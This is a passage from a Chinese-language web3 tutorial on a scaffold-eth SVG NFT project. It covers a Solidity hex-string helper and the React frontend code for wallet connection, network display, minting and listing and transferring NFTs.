class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><code>HexStrings.sol</code> 库：主要作用是将 <code>uint</code> 按 <code>length</code> 位提取，对应于生成公钥时截取前20位的功能： <code>(*uint160*(ownerOf(id))).toHexString(20)</code>，此表达式生成对应 <code>tokenId</code> 所有者的地址。</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">library HexStrings &#123;</span><br><span class="line">    bytes16 internal constant ALPHABET = &#x27;0123456789abcdef&#x27;;</span><br><span class="line"></span><br><span class="line">    function toHexString(uint256 value, uint256 length) internal pure returns (string memory) &#123;</span><br><span class="line">        bytes memory buffer = new bytes(2 * length + 2);</span><br><span class="line">        buffer[0] = &#x27;0&#x27;;</span><br><span class="line">        buffer[1] = &#x27;x&#x27;;</span><br><span class="line">        for (uint256 i = 2 * length + 1; i &gt; 1; --i) &#123;</span><br><span class="line">            buffer[i] = ALPHABET[value &amp; 0xf];</span><br><span class="line">            value &gt;&gt;= 4;</span><br><span class="line">        &#125;</span><br><span class="line">        return string(buffer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此，合约源码分析完成。</p><p>下面我们将对前端的逻辑进行简要分析，然后我们将一步步实现 NFT 铸造和展示的功能。将代码切换到前端代码提交之前，按照以下的步骤一步步添加功能。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git checkout a98156f6a03a0bc8fc98c8c77cef6fbf59f03b31</span><br></pre></td></tr></table></figure><h2><span id="qian-duan-luo-ji-fen-xi">前端逻辑分析</span></h2><p>项目前端文件在 <code>packages/react-app</code> 内，以下文章中涉及文件的位置都将在这个文件中寻找。</p><p>我们首先来看一下 <code>src/App.jsx</code> ，这是项目的主要页面，我们可以利用代码编辑器查看这个文件的主要部分：</p><p><img src="https://user-images.githubusercontent.com/3297411/153822564-f2f96aa8-1336-475b-adc8-cc251405cdff.png" alt="Appjsx"></p><p>其中包含的功能和组件包括：</p><ul><li><code>Header</code>：标题栏，显示标题</li><li><em><code>NetworkDisplay</code>：所处网络状态</em></li><li><em><code>Menu</code>， <code>Switch</code>：菜单切换</em></li><li><em><code>ThemeSwitch</code>：右下角明暗主题切换</em></li><li><em><code>Account</code>：右上角账户信息组件</em></li><li>接下来的两个 <code>Row</code> 对应左下角的 Gas 显示、支持和本地的水龙头</li></ul><p>下面我们主要看一下 <em><code>NetworkDisplay</code>和 <code>Account</code> 的逻辑实现，以及 <code>Menu</code>， <code>Switch</code> 中的功能。</em></p><h3><span id="networkdisplay"><em><code>NetworkDisplay</code></em></span></h3><p>组件位置： <code>src/components/NetworkDisplay.jsx</code></p><p>主要包含两个功能：</p><ol><li>显示当前所选择的网络名称；</li><li>如果当前钱包所在网络与项目中网络设置不一致，则提示警告，其中，当选择本地网络是，网络 ID 需要设置为 <code>31337</code> 。</li></ol><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">NetworkDisplay</span>(<span class="params">&#123;</span></span><br><span class="line"><span class="params">  NETWORKCHECK,</span></span><br><span class="line"><span class="params">  localChainId,</span></span><br><span class="line"><span class="params">  selectedChainId,</span></span><br><span class="line"><span class="params">  targetNetwork,</span></span><br><span class="line"><span class="params">  USE_NETWORK_SELECTOR,</span></span><br><span class="line"><span class="params">  logoutOfWeb3Modal,</span></span><br><span class="line"><span class="params">&#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> networkDisplay = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable constant_">NETWORKCHECK</span> &amp;&amp; localChainId &amp;&amp; selectedChainId &amp;&amp; localChainId !== selectedChainId) &#123;</span><br><span class="line">    <span class="keyword">const</span> networkSelected = <span class="title function_">NETWORK</span>(selectedChainId);</span><br><span class="line">    <span class="keyword">const</span> networkLocal = <span class="title function_">NETWORK</span>(localChainId);</span><br><span class="line">    <span class="keyword">if</span> (selectedChainId === <span class="number">1337</span> &amp;&amp; localChainId === <span class="number">31337</span>) &#123;</span><br><span class="line"><span class="comment">// 提示错误的网络ID</span></span><br><span class="line">...</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// 提示网络错误</span></span><br><span class="line">...</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    networkDisplay = <span class="variable constant_">USE_NETWORK_SELECTOR</span> ? <span class="literal">null</span> : (</span><br><span class="line">      <span class="comment">// 显示网络名称</span></span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&#123;&#123;</span> <span class="attr">zIndex:</span> <span class="attr">-1</span>, <span class="attr">position:</span> &quot;<span class="attr">absolute</span>&quot;, <span class="attr">right:</span> <span class="attr">154</span>, <span class="attr">top:</span> <span class="attr">28</span>, <span class="attr">padding:</span> <span class="attr">16</span>, <span class="attr">color:</span> <span class="attr">targetNetwork.color</span> &#125;&#125;&gt;</span></span></span><br><span class="line"><span class="language-xml">        &#123;targetNetwork.name&#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(&#123; networkDisplay &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> networkDisplay;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="account"><em><code>Account</code></em></span></h3><p>组件位置： <code>src/components/Account.jsx</code></p><p>主要包含两个功能：</p><ol><li>显示当前钱包</li><li>显示钱包余额</li><li>显示 <code>Connect</code> 或者 <code>Logout</code></li></ol><p>其中，当用户点击 <code>Connect</code> 时，前端调用 <em><code>loadWeb3Modal</code>，代码如下，这个函数的需要功能是与MetaMask等钱包进行连接，并监听钱包的</em>  <code>chainChanged</code>，<code>accountsChanged</code> 和 <code>disconnect</code> 事件，即当我们在钱包中切换网络，选择连接账户以及取消连接时对应修改显示状态。</p><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> loadWeb3Modal = <span class="title function_">useCallback</span>(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line"><span class="comment">// 连接钱包</span></span><br><span class="line">  <span class="keyword">const</span> provider = <span class="keyword">await</span> web3Modal.<span class="title function_">connect</span>();</span><br><span class="line">  <span class="title function_">setInjectedProvider</span>(<span class="keyword">new</span> ethers.<span class="property">providers</span>.<span class="title class_">Web3Provider</span>(provider));</span><br><span class="line"><span class="comment">// 监听切换网络</span></span><br><span class="line">  provider.<span class="title function_">on</span>(<span class="string">&quot;chainChanged&quot;</span>, <span class="function"><span class="params">chainId</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`chain changed to <span class="subst">$&#123;chainId&#125;</span>! updating providers`</span>);</span><br><span class="line">    <span class="title function_">setInjectedProvider</span>(<span class="keyword">new</span> ethers.<span class="property">providers</span>.<span class="title class_">Web3Provider</span>(provider));</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="comment">// 监听切换账户</span></span><br><span class="line">  provider.<span class="title function_">on</span>(<span class="string">&quot;accountsChanged&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`account changed!`</span>);</span><br><span class="line">    <span class="title function_">setInjectedProvider</span>(<span class="keyword">new</span> ethers.<span class="property">providers</span>.<span class="title class_">Web3Provider</span>(provider));</span><br><span class="line">  &#125;);</span><br><span class="line"><span class="comment">// 监听断开连接</span></span><br><span class="line">  <span class="comment">// Subscribe to session disconnection</span></span><br><span class="line">  provider.<span class="title function_">on</span>(<span class="string">&quot;disconnect&quot;</span>, <span class="function">(<span class="params">code, reason</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(code, reason);</span><br><span class="line">    <span class="title function_">logoutOfWeb3Modal</span>();</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="comment">// eslint-disable-next-line</span></span><br><span class="line">&#125;, [setInjectedProvider]);</span><br></pre></td></tr></table></figure><p>同理，在连接钱包情况下，用户点击 <code>Logout</code> 会调用 <code>logoutOfWeb3Modal</code> 功能，</p><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">logoutOfWeb3Modal</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; &#123;</span><br><span class="line"><span class="comment">// 清楚缓存的网络提供商，并断开连接</span></span><br><span class="line">    <span class="keyword">await</span> web3Modal.<span class="title function_">clearCachedProvider</span>();</span><br><span class="line">    <span class="keyword">if</span> (injectedProvider &amp;&amp; injectedProvider.<span class="property">provider</span> &amp;&amp; <span class="keyword">typeof</span> injectedProvider.<span class="property">provider</span>.<span class="property">disconnect</span> == <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">await</span> injectedProvider.<span class="property">provider</span>.<span class="title function_">disconnect</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">window</span>.<span class="property">location</span>.<span class="title function_">reload</span>();</span><br><span class="line">    &#125;, <span class="number">1</span>);</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure><h3><span id="menu-switch"><em><code>Menu</code>， <code>Switch</code></em></span></h3><p>这两个分别对应显示菜单和对应切换菜单功能，这些菜单包括：</p><ul><li><code>App Home</code> ：项目希望我们将需要实现的功能放在这个菜单中，比如我们将要实现的 NFT 的铸造和展示功能；</li><li><code>Debug Contracts</code>：调试自己编写的合约功能，将会根据合约的 ABI 文件 展示可以合约的状态变量和可以调用的函数；</li><li><code>Hints</code>：编程提示</li><li><code>ExampleUI</code>：示例UI，可以做为编程使用</li><li><code>Mainnet DAI</code>：以太坊主网 <code>DAI</code> 的合约状态和可用函数，与 <code>Debug Contracts</code> 功能一直</li><li><code>Subgraph</code>：使用 The Graph 协议对合约中的事件进行监听和查询。</li></ul><h3><span id="diao-shi-xin-xi">调试信息</span></h3><p><code>App.jsx</code> 中还包含了打印当前页面状态的调试信息，可以在开发的过程中实时查看当前状态变量。</p><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// 🧫 DEBUG 👨🏻‍🔬</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line">    <span class="variable constant_">DEBUG</span> &amp;&amp;</span><br><span class="line">    mainnetProvider &amp;&amp;</span><br><span class="line">    address &amp;&amp;</span><br><span class="line">    selectedChainId &amp;&amp;</span><br><span class="line">    yourLocalBalance &amp;&amp;</span><br><span class="line">    yourMainnetBalance &amp;&amp;</span><br><span class="line">    readContracts &amp;&amp;</span><br><span class="line">    writeContracts &amp;&amp;</span><br><span class="line">    mainnetContracts</span><br><span class="line">  ) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;_____________________________________ 🏗 scaffold-eth _____________________________________&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;🌎 mainnetProvider&quot;</span>, mainnetProvider);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;🏠 localChainId&quot;</span>, localChainId);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;👩‍💼 selected address:&quot;</span>, address);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;🕵🏻‍♂️ selectedChainId:&quot;</span>, selectedChainId);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;💵 yourLocalBalance&quot;</span>, yourLocalBalance ? ethers.<span class="property">utils</span>.<span class="title function_">formatEther</span>(yourLocalBalance) : <span class="string">&quot;...&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;💵 yourMainnetBalance&quot;</span>, yourMainnetBalance ? ethers.<span class="property">utils</span>.<span class="title function_">formatEther</span>(yourMainnetBalance) : <span class="string">&quot;...&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;📝 readContracts&quot;</span>, readContracts);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;🌍 DAI contract on mainnet:&quot;</span>, mainnetContracts);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;💵 yourMainnetDAIBalance&quot;</span>, myMainnetDAIBalance);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;🔐 writeContracts&quot;</span>, writeContracts);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, [</span><br><span class="line">  mainnetProvider,</span><br><span class="line">  address,</span><br><span class="line">  selectedChainId,</span><br><span class="line">  yourLocalBalance,</span><br><span class="line">  yourMainnetBalance,</span><br><span class="line">  readContracts,</span><br><span class="line">  writeContracts,</span><br><span class="line">  mainnetContracts,</span><br><span class="line">  localChainId,</span><br><span class="line">  myMainnetDAIBalance,</span><br><span class="line">]);</span><br></pre></td></tr></table></figure><p>查看完主页的基本功能，下面我们开始实现 NFT 铸造和展示 NFT 列表这两个功能。</p><h2><span id="nft-gong-neng-shi-xian">NFT 功能实现</span></h2><p>我们将主要实现以下三个部分功能：</p><ul><li>铸造 NFT；</li><li>展示 NFT 列表；</li><li>展示 NFT 合约接口列表。</li></ul><h3><span id="zhu-zao-nft">铸造 NFT</span></h3><p>首先我们找到 <code>App Home</code> 对应使用的组件，从下面的代码中可以看到，对应使用 <code>Home</code> 组件，所在位置为 <code>src/views/Home.jsx</code> 。</p><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">&lt;<span class="title class_">Switch</span>&gt;</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">Route</span> <span class="attr">exact</span> <span class="attr">path</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;/* pass in any web3 props to this Home component. For example, yourLocalBalance */&#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Home</span> <span class="attr">yourLocalBalance</span>=<span class="string">&#123;yourLocalBalance&#125;</span> <span class="attr">readContracts</span>=<span class="string">&#123;readContracts&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">Route</span>&gt;</span></span></span><br><span class="line">....</span><br></pre></td></tr></table></figure><p>删除 <code>Home.jsx</code> 中内容，添加以下 Mint 按钮：</p><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span>, &#123; useState &#125; <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Button</span>, <span class="title class_">Card</span>, <span class="title class_">List</span> &#125; <span class="keyword">from</span> <span class="string">&quot;antd&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Home</span>(<span class="params">&#123; </span></span><br><span class="line"><span class="params">  isSigner,</span></span><br><span class="line"><span class="params">  loadWeb3Modal,</span></span><br><span class="line"><span class="params">  tx,</span></span><br><span class="line"><span class="params">  writeContracts,</span></span><br><span class="line"><span class="params">&#125;</span>) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;/* Mint button */&#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&#123;&#123;</span> <span class="attr">maxWidth:</span> <span class="attr">820</span>, <span class="attr">margin:</span> &quot;<span class="attr">auto</span>&quot;, <span class="attr">marginTop:</span> <span class="attr">32</span>, <span class="attr">paddingBottom:</span> <span class="attr">32</span> &#125;&#125;&gt;</span></span></span><br><span class="line"><span class="language-xml">        &#123;isSigner?(</span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">Button</span> <span class="attr">type</span>=<span class="string">&#123;</span>&quot;<span class="attr">primary</span>&quot;&#125; <span class="attr">onClick</span>=<span class="string">&#123;()</span>=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-xml">            tx( writeContracts.YourCollectible.mintItem() )</span></span><br><span class="line"><span class="language-xml">          &#125;&#125;&gt;MINT<span class="tag">&lt;/<span class="name">Button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        ):(</span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">Button</span> <span class="attr">type</span>=<span class="string">&#123;</span>&quot;<span class="attr">primary</span>&quot;&#125; <span class="attr">onClick</span>=<span class="string">&#123;loadWeb3Modal&#125;</span>&gt;</span>CONNECT WALLET<span class="tag">&lt;/<span class="name">Button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        )&#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">Home</span>;</span><br></pre></td></tr></table></figure><p>同时将 <code>Switch</code> 中对应组件使用修改为：</p><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">&lt;<span class="title class_">Switch</span>&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">Route</span> <span class="attr">exact</span> <span class="attr">path</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    &#123;/* pass in any web3 props to this Home component. For example, yourLocalBalance */&#125;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">Home</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">isSigner</span>=<span class="string">&#123;userSigner&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">loadWeb3Modal</span>=<span class="string">&#123;loadWeb3Modal&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">tx</span>=<span class="string">&#123;tx&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">writeContracts</span>=<span class="string">&#123;writeContracts&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">    /&gt;</span></span></span><br><span class="line"><span class="language-xml"> ...</span></span><br></pre></td></tr></table></figure><p>效果图为：</p><p><img src="https://user-images.githubusercontent.com/3297411/153822638-2ce70ded-289b-411e-9ed5-c78507617427.png" alt="mint-button"></p><p>点击 Mint 之后，我们可以看到交易成功发出，这时，虽然我们成功 mint 了 NFT，但是我们还需要添加列表来展示我们的 NFT。</p><h3><span id="zhan-shi-nft-lie-biao">展示 NFT 列表</span></h3><p>添加列表展示，其中包含 NFT 的转移功能可以将对应的 NFT 发送给其他地址。</p><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span>, &#123; useState &#125; <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Button</span>, <span class="title class_">Card</span>, <span class="title class_">List</span> &#125; <span class="keyword">from</span> <span class="string">&quot;antd&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; useContractReader &#125; <span class="keyword">from</span> <span class="string">&quot;eth-hooks&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Address</span>, <span class="title class_">AddressInput</span>&#125; <span class="keyword">from</span> <span class="string">&quot;../components&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Home</span>(<span class="params">&#123; </span></span><br><span class="line"><span class="params">  isSigner,</span></span><br><span class="line"><span class="params">  loadWeb3Modal,</span></span><br><span class="line"><span class="params">  yourCollectibles,</span></span><br><span class="line"><span class="params">  address,</span></span><br><span class="line"><span class="params">  blockExplorer,</span></span><br><span class="line"><span class="params">  mainnetProvider,</span></span><br><span class="line"><span class="params">  tx,</span></span><br><span class="line"><span class="params">  readContracts,</span></span><br><span class="line"><span class="params">  writeContracts,</span></span><br><span class="line"><span class="params">&#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> [transferToAddresses, setTransferToAddresses] = <span class="title function_">useState</span>(&#123;&#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;/* Mint 按钮 */&#125;</span></span><br><span class="line"><span class="language-xml">...</span></span><br><span class="line"><span class="language-xml">&#123;/* 列表 */&#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&#123;&#123;</span> <span class="attr">width:</span> <span class="attr">820</span>, <span class="attr">margin:</span> &quot;<span class="attr">auto</span>&quot;, <span class="attr">paddingBottom:</span> <span class="attr">256</span> &#125;&#125;&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">List</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">bordered</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">dataSource</span>=<span class="string">&#123;yourCollectibles&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">          <span class="attr">renderItem</span>=<span class="string">&#123;item</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-xml">            const id = item.id.toNumber();</span></span><br><span class="line"><span class="language-xml">            console.log(&quot;IMAGE&quot;,item.image)</span></span><br><span class="line"><span class="language-xml">            return (</span></span><br><span class="line"><span class="language-xml">              <span class="tag">&lt;<span class="name">List.Item</span> <span class="attr">key</span>=<span class="string">&#123;id</span> + &quot;<span class="attr">_</span>&quot; + <span class="attr">item.uri</span> + &quot;<span class="attr">_</span>&quot; + <span class="attr">item.owner</span>&#125;&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">Card</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">                  <span class="attr">title</span>=<span class="string">&#123;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">                    &lt;<span class="attr">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                      <span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&#123;&#123;</span> <span class="attr">fontSize:</span> <span class="attr">18</span>, <span class="attr">marginRight:</span> <span class="attr">8</span> &#125;&#125;&gt;</span>&#123;item.name&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                  &#125;</span></span><br><span class="line"><span class="language-xml">                &gt;</span></span><br><span class="line"><span class="language-xml">                  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#123;</span>&quot;<span class="attr">https:</span>//<span class="attr">opensea.io</span>/<span class="attr">assets</span>/&quot;+(<span class="attr">readContracts</span> &amp;&amp; <span class="attr">readContracts.YourCollectible</span> &amp;&amp; <span class="attr">readContracts.YourCollectible.address</span>)+&quot;/&quot;+<span class="attr">item.id</span>&#125; <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#123;item.image&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">                  <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                  <span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;item.description&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;/<span class="name">Card</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">&#123;/* NFT 转移 */&#125;</span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                  owner:&#123;&quot; &quot;&#125;</span></span><br><span class="line"><span class="language-xml">                  <span class="tag">&lt;<span class="name">Address</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">                    <span class="attr">address</span>=<span class="string">&#123;item.owner&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">                    <span class="attr">ensProvider</span>=<span class="string">&#123;mainnetProvider&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">                    <span class="attr">blockExplorer</span>=<span class="string">&#123;blockExplorer&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">                    <span class="attr">fontSize</span>=<span class="string">&#123;16&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">                  /&gt;</span></span></span><br><span class="line"><span class="language-xml">                  <span class="tag">&lt;<span class="name">AddressInput</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">                    <span class="attr">ensProvider</span>=<span class="string">&#123;mainnetProvider&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">                    <span class="attr">placeholder</span>=<span class="string">&quot;transfer to address&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">                    <span class="attr">value</span>=<span class="string">&#123;transferToAddresses[id]&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">                    <span class="attr">onChange</span>=<span class="string">&#123;newValue</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-xml">                      const update = &#123;&#125;;</span></span><br><span class="line"><span class="language-xml">                      update[id] = newValue;</span></span><br><span class="line"><span class="language-xml">                      setTransferToAddresses(&#123; ...transferToAddresses, ...update &#125;);</span></span><br><span class="line"><span class="language-xml">                    &#125;&#125;</span></span><br><span class="line"><span class="language-xml">                  /&gt;</span></span><br><span class="line"><span class="language-xml">                  <span class="tag">&lt;<span class="name">Button</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">                    <span class="attr">onClick</span>=<span class="string">&#123;()</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-xml">                      console.log(&quot;writeContracts&quot;, writeContracts);</span></span><br><span class="line"><span class="language-xml">                      tx(writeContracts.YourCollectible.transferFrom(address, transferToAddresses[id], id));</span></span><br><span class="line"><span class="language-xml">                    &#125;&#125;</span></span><br><span class="line"><span class="language-xml">                  &gt;</span></span><br><span class="line"><span class="language-xml">                    Transfer</span></span><br><span class="line"><span class="language-xml">                  <span class="tag">&lt;/<span class="name">Button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">              <span class="tag">&lt;/<span class="name">List.Item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            );</span></span><br><span class="line"><span class="language-xml">          &#125;&#125;</span></span><br><span class="line"><span class="language-xml">        /&gt;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;/* 信息提示 */&#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&#123;&#123;</span> <span class="attr">maxWidth:</span> <span class="attr">820</span>, <span class="attr">margin:</span> &quot;<span class="attr">auto</span>&quot;, <span class="attr">marginTop:</span> <span class="attr">32</span>, <span class="attr">paddingBottom:</span> <span class="attr">256</span> &#125;&#125;&gt;</span></span></span><br><span class="line"><span class="language-xml">        🛠 built with <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://github.com/austintgriffith/scaffold-eth&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span>🏗 scaffold-eth<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        🍴 <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://github.com/austintgriffith/scaffold-eth&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span>Fork this repo<span class="tag">&lt;/<span class="name">a</span>&gt;</span> and build a cool SVG NFT!</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">Home</span>;</span><br></pre></td></tr></table></figure><p>对应组件使用修改为：</p><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">&lt;<span class="title class_">Switch</span>&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">Route</span> <span class="attr">exact</span> <span class="attr">path</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    &#123;/* pass in any web3 props to 